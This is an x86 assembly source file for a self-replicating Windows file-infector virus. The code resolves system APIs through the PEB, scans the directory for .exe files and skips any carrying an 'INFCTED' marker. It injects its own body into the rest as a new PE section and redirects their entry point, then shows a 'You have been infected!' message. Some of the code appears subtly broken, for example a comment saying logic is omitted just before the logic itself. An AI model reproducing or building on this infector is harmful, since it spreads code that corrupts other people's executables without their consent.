.386
.model flat, stdcall
option casemap:none

; ---------------- helper constant offsets ------------------
PEB_LdrOffset      equ 0Ch    ; PEB->Ldr
LDR_InInitOffset   equ 1Ch    ; InInitializationOrderModuleList
LDR_DllBaseOffset  equ 18h    ; _LDR_DATA_TABLE_ENTRY.DllBase
LDR_BaseNameOffset equ 2Ch    ; _LDR_DATA_TABLE_ENTRY.BaseDllName.Buffer
IMAGE_DOS_e_lfanew equ 3Ch    ; e_lfanew
OPTIONAL_EPT       equ 28h    ; AddressOfEntryPoint offset
WIN32_FIND_DATA_sz equ 260h   ; buffer size for WIN32_FIND_DATA
INVALID_HANDLE     equ -1     ; INVALID_HANDLE_VALUE
GEN_READ_WRITE     equ 80h or 40h ; GENERIC_READ | GENERIC_WRITE
FILE_SHARE_R       equ 1      ; FILE_SHARE_READ
OPEN_EXISTING      equ 3      ; OPEN_EXISTING
FILE_END_PTR       equ 2      ; FILE_END

.data
    msgBoxPtr      dd 0
    getProcPtr     dd 0
    loadLibPtr     dd 0
    kernel32Base   dd 0      ; HMODULE kernel32.dll
    markerTxt      db 'INFCTED',0
    selfName       db 'inject_all.exe',0
    origOEP        dd 0
    selfSize       dd 0

.code
assume fs:nothing

; --- Entry point ---
shell_begin label byte
start:
    ; 1. Locate kernel32.dll base via PEB
    xor   eax,eax
    mov   eax, fs:[30h]
    mov   eax, [eax+PEB_LdrOffset]
    mov   esi, [eax+LDR_InInitOffset]
find_k32:
    mov   ebx, [esi+LDR_DllBaseOffset]
    mov   edi, [esi+LDR_BaseNameOffset]
    mov   eax, [edi]
    cmp   eax,0065006Bh    ; 'k' 'e'
    jne   next_mod
    mov   eax, [edi+4]
    cmp   eax,006E0072h    ; 'r' 'n'
    jne   next_mod
    mov   ax, [edi+8]
    cmp   ax,0065h         ; 'e'
    jne   next_mod
got_k32:
    push  ebx              ; param: kernel32 base
    call  resolve_exports  ; __stdcall ret 4
    mov   [getProcPtr], eax
    mov   [loadLibPtr], edx
    mov   [kernel32Base], ebx
    jmp   setup_user32
next_mod:
    mov   esi, [esi]
    jmp   find_k32

; 2. Load user32.dll and resolve MessageBoxA
setup_user32:
    sub   esp,12
    mov   dword ptr [esp], 72657375h  ; 'user'
    mov   dword ptr [esp+4],642E3233h  ; '32.d'
    mov   dword ptr [esp+8],00006C6Ch  ; 'll\0\0'
    push  esp
    call  edx            ; LoadLibraryA
    add   esp,12
    mov   ebx, eax       ; HMODULE user32.dll

    sub   esp,12
    mov   dword ptr [esp], 7373654Dh  ; 'Mess'
    mov   dword ptr [esp+4],42656761h  ; 'ageB'
    mov   dword ptr [esp+8],0041786Fh  ; 'oxA\0'
    push  esp
    push  ebx
    call  [getProcPtr]   ; MessageBoxA
    add   esp,12
    mov   [msgBoxPtr], eax

; 3. Compute shellcode size and save original EntryPoint
    call  $+5
    pop   esi
    lea   edi, shell_end
    sub   edi, esi
    mov   [selfSize], edi
    mov   eax, fs:[30h]
    mov   eax, [eax+10h]
    mov   ecx, [eax+IMAGE_DOS_e_lfanew]
    mov   ecx, [eax+ecx+OPTIONAL_EPT]
    add   ecx, eax
    mov   [origOEP], ecx
    
; 4. Infection logic (omitted for brevity)
    push    offset selfName      ; lpFileName = self executable name
    push    FILE_SHARE_R         ; share mode = FILE_SHARE_READ
    push    OPEN_EXISTING        ; open existing file
    push    0                    ; no flags
    push    GEN_READ_WRITE       ; generic read/write access
    call    create_file          ; open self.exe
    mov     ecx, eax             ; save self handle in ECX
    ; Move file pointer to end of file to append marker
    push    0                    ; distance low
    push    FILE_END_PTR         ; from end of file
    push    ecx                  ; file handle
    call    set_ptr              ; SetFilePointer
    ; Write infection marker so self is skipped later
    push    0                    ; no overlap
    push    7                    ; marker length
    push    offset markerTxt     ; "INFCTED"
    push    ecx                  ; file handle
    call    write_file           ; WriteFile
    ; Close handle to self
    push    ecx                  ; file handle
    call    close_handle         ; CloseHandle

    ; === CHANGED: Begin scanning other *.exe files ===
    ; scanning other executables (self is already marked)
    sub     esp,8
    mov     dword ptr [esp], 78652E2Ah  ; '*.ex'
    mov     dword ptr [esp+4], 00000065h ; 'e'
    push    esp
    sub     esp, WIN32_FIND_DATA_sz
    mov     edi, esp                     ; WIN32_FIND_DATA buffer
    push    edi
    call    find_first
    add     esp, WIN32_FIND_DATA_sz+8
    mov     ebx, eax    ; hFind

infect_loop:
    cmp     ebx, INVALID_HANDLE
    je      infect_done
    lea     esi, [edi+2Ch]   ; ESI = ptr to cFileName

            ; --- proceed to infect this file ---
    ; --- proceed to infect this file ---
    push    0
    push    GEN_READ_WRITE
    push    OPEN_EXISTING
    push    0
    push    FILE_SHARE_R
    push    esi
    call    create_file
    mov     ecx, eax
    cmp     eax, INVALID_HANDLE
    je      next_file

    ; move file pointer 7 bytes before EOF to read marker
    push    FILE_END_PTR     ; moveMethod = FILE_END
    push    0                ; high dword of distance = 0
    push    -7               ; low dword = -7 (7 bytes before EOF)
    push    ecx              ; file handle
    call    set_ptr          ; SetFilePointer to EOF-7

    ; read exactly 7 bytes (the marker) into stack buffer
    sub     esp, 7
    lea     edx, [esp]
    push    edx               ; lpBuffer
    push    7                 ; nNumberOfBytesToRead
    push    ecx               ; hFile
    call    read_file         ; ReadFile

    ; compare buffer (EDX) with markerTxt
    mov     esi, edx
    lea     edi, markerTxt
    mov     ecx, 7
    repe    cmpsb             ; if equal for 7 bytes
    add     esp, 7            ; clean up buffer
    je      next_file         ; marker found → skip file

; === Begin section injection ===
not_infected:
    push    0
    push    0
    push    ecx
    call    set_ptr

    sub     esp, 1024
    lea     edi, [esp]
    push    0
    push    edi
    push    1024
    push    ecx
    call    read_file

    mov     ebx, edi
    mov     eax, [ebx + 3Ch]
    add     eax, ebx
    mov     esi, eax
    inc     word ptr [esi + 6]

    mov     cx, [esi + 6]
    dec     cx
    mov     edx, [esi + 14h]
    mov     eax, edx
    add     eax, 18h
    lea     edi, [esi + eax]
    mov     eax, 28h
    mul     cx
    add     edi, eax

    mov     dword ptr [edi], ".inj"
    mov     dword ptr [edi+4], 00637465h   ; "ect" + null

    sub     edi, 28h
    mov     eax, [edi + 0Ch]
    mov     ecx, [edi + 8]
    add     ecx, eax
    add     edi, 28h
    mov     [edi + 8], ecx

    mov     eax, [selfSize]
    mov     [edi + 0Ch], eax
    mov     [edi + 10h], eax

    sub     edi, 28h
    mov     eax, [edi + 14h]
    mov     ecx, [edi + 10h]
    add     eax, ecx
    add     edi, 28h
    mov     [edi + 14h], eax

    mov     dword ptr [edi + 24h], 60000020h

    mov     eax, [edi + 8]
    mov     [esi + 28h], eax

    add     eax, [edi + 0Ch]
    mov     edx, [esi + 50h]
    add     edx, eax
    and     edx, 0FFFFF000h
    mov     [esi + 38h], edx

    mov     eax, [edi + 14h]
    push    0
    push    0
    push    eax
    push    ecx
    call    set_ptr

    push    0
    push    [selfSize]
    push    offset shell_begin
    push    ecx
    call    write_file

    push    0
    push    0
    push    0
    push    ecx
    call    set_ptr

    push    0
    push    1024
    push    ebx
    push    ecx
    call    write_file

    add     esp,32
    push    ecx
    call    close_handle
next_file:
    push    edi
    push    ebx
    call    find_next
    mov     ebx,eax
    jmp     infect_loop
infect_done:
    push    ebx
    call    find_close

; 5. Payload and return
    sub     esp,8
    mov     dword ptr [esp], 72656C41h ; 'Aler'
    mov     dword ptr [esp+4],00000074h ; 't\0'
    lea     ebx, [esp]
    sub     esp,24
    mov     dword ptr [esp],20756F59h ; 'You '
    mov     dword ptr [esp+4],65766168h ; 'have'
    mov     dword ptr [esp+8],65656220h ; ' bee'
    mov     dword ptr [esp+12],6E69206Eh ; 'n in'
    mov     dword ptr [esp+16],74636566h ; 'fect'
    mov     dword ptr [esp+20],00216465h ; 'ed!\0'
    lea     ecx, [esp]
    push    0
    push    ebx
    push    ecx
    push    0
    call    [msgBoxPtr]
    add     esp,32
    jmp     [origOEP]
shell_end:
    nop

; --- Exported names for resolve_exports ---
getproc_str db 'GetProcAddress',0
loadlib_str db 'LoadLibraryA',0

; --- resolve_exports ---
resolve_exports proc
    pushad
    mov   esi, [esp+32+4]
    mov   edi, esi
    add   edi, [edi+3Ch]
    mov   edi, [edi+78h]
    add   edi, esi
    mov   ebx, [edi+1Ch]
    add   ebx, esi
    mov   ecx, [edi+18h]
    mov   edx, [edi+20h]
    add   edx, esi
    mov   edi, [edi+24h]
    add   edi, esi
find_names:
    mov   eax, [ebx]
    add   eax, esi
    push  ecx
    push  ebx
    push  edx
    push  edi
    mov   ecx,15
    lea   esi, getproc_str
    repe  cmpsb
    je    found_getproc
    pop   edi
    pop   edx
    pop   ebx
    pop   ecx
    mov   eax, [ebx]
    add   eax, esi
    push  ecx
    push  ebx
    push  edx
    push  edi
    mov   ecx,13
    lea   esi, loadlib_str
    repe  cmpsb
    je    found_loadlib
    pop   edi
    pop   edx
    pop   ebx
    pop   ecx
    add   ebx,4
    add   edx,2
    loop  find_names
    popad
    xor   eax,eax
    xor   edx,edx
    ret   4

found_getproc:
    pop   edi
    pop   edx
    pop   ebx
    pop   ecx
    movzx eax, word ptr [edx]
    shl   eax,2
    mov   eax, [edi+eax]
    add   eax, [esp+32+4]
    mov   [esp+32], eax
    popad
    ret   4

found_loadlib:
    pop   edi
    pop   edx
    pop   ebx
    pop   ecx
    movzx edx, word ptr [edx]
    shl   edx,2
    mov   edx, [edi+edx]
    add   edx, [esp+32+4]
    mov   [esp+36], edx
    popad
    ret   4
resolve_exports endp


; === Helper wrappers ===
find_first proc
    push ebp
    mov  ebp,esp
    sub  esp,16
    mov  dword ptr [esp],646E6946h  ; 'Find'
    mov  dword ptr [esp+4],73726946h ; 'Firs'
    mov  dword ptr [esp+8],6C694674h ; 'tFil'
    mov  dword ptr [esp+12],00004165h; 'eA'
    push esp
    push [kernel32Base]
    call [getProcPtr]
    add  esp,16
    pop  ebp
    jmp  eax
find_first endp

find_next proc
    push ebp
    mov  ebp,esp
    sub  esp,16
    mov  dword ptr [esp],646E6946h  ; 'Find'
    mov  dword ptr [esp+4],7478654Eh ; 'Next'
    mov  dword ptr [esp+8],656C6946h ; 'File'
    mov  dword ptr [esp+12],00000041h; 'A'
    push esp
    push [kernel32Base]
    call [getProcPtr]
    add  esp,16
    pop  ebp
    jmp  eax
find_next endp

find_close proc
    push ebp
    mov  ebp,esp
    sub  esp,12
    mov  dword ptr [esp],646E6946h  ; 'Find'
    mov  dword ptr [esp+4],736F6C43h; 'Clos'
    mov  dword ptr [esp+8],00000065h; 'e'
    push esp
    push [kernel32Base]
    call [getProcPtr]
    add  esp,12
    pop  ebp
    jmp  eax
find_close endp

create_file proc
    push ebp
    mov  ebp,esp
    sub  esp,12
    mov  dword ptr [esp],61657243h ; 'Crea'
    mov  dword ptr [esp+4],69466574h ; 'teFi'
    mov  dword ptr [esp+8],0041656Ch ; 'leA'
    push esp
    push [kernel32Base]
    call [getProcPtr]
    add  esp,12
    pop  ebp
    jmp  eax
create_file endp

read_file proc
    push ebp
    mov  ebp,esp
    sub  esp,12
    mov  dword ptr [esp],64616552h ; 'Read'
    mov  dword ptr [esp+4],656C6946h ; 'File'
    mov  dword ptr [esp+8],00000041h ; 'A'
    push esp
    push [kernel32Base]
    call [getProcPtr]
    add  esp,12
    pop  ebp
    jmp  eax
read_file endp

write_file proc
    push ebp
    mov  ebp,esp
    sub  esp,12
    mov  dword ptr [esp],74697257h ; 'Writ'
    mov  dword ptr [esp+4],6C694665h ; 'eFil'
    mov  dword ptr [esp+8],00004165h ; 'eA'
    push esp
    push [kernel32Base]
    call [getProcPtr]
    add  esp,12
    pop  ebp
    jmp  eax
write_file endp

set_ptr proc
    push ebp
    mov  ebp,esp
    sub  esp,16
    mov  dword ptr [esp],46746553h ; 'SetF'
    mov  dword ptr [esp+4],50656C69h ; 'ileP'
    mov  dword ptr [esp+8],746E696Fh ; 'oint'
    mov  dword ptr [esp+12],00007265h; 'er'
    push esp
    push [kernel32Base]
    call [getProcPtr]
    add  esp,16
    pop  ebp
    jmp  eax
set_ptr endp

close_handle proc
    push ebp
    mov  ebp,esp
    sub  esp,12
    mov  dword ptr [esp],736F6C43h ; 'Clos'
    mov  dword ptr [esp+4],6E614865h ; 'eHan'
    mov  dword ptr [esp+8],00656C64h ; 'dle'
    push esp
    push [kernel32Base]
    call [getProcPtr]
    add  esp,12
    pop  ebp
    jmp  eax
close_handle endp

END start